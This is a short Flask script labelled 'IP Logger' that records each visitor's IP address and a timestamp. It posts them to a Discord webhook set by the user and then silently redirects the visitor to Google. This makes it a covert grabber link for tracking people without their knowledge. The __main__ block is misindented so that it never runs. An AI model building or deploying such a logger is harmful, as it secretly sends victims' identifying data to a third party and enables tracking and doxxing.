from flask import Flask, request, redirect
from datetime import datetime
import requests


app = Flask(__name__)

def send_ip(ip, date):
    weebhook_url = "https://discord.com/api/webhooks/your_webhook_here"
    # Replace with your actual webhook URL
    data = {
        "content": "",
        "title": "IP Logger",
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": date
        }
    ]
    requests.post(weebhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")

    send_ip(ip, date)
    
    return redirect("https://www.google.com")



    if __name__ == "__main__":
        app.run(host='0.0.0.0')